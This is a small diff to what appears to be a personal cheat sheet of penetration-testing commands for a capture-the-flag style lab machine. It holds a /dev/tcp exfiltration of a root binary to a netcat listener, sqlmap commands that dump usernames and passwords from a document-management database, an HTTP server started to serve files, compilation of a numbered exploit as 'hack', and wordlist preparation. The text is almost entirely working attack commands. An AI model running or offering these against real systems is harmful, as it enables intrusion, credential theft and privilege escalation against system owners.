@@ -10,4 +10,6 @@ nc -lvnp 3333 > reset_root (our terminal) | cat /usr/bin/reset_root > /dev/tcp/1
 sqlmap -u "http://192.168.0.107/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbms=mysql --batch --level=5 --tables
 sqlmap -u "http://192.168.0.107/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user -C  id,username,password  --dump --batch 
 python3 -m http.server 8000 --bind 0.0.0.0
-gcc 37292.c -o payload
+gcc 37292.c -o hack
+sort fsocity.dic | uniq -u > f.dic
+
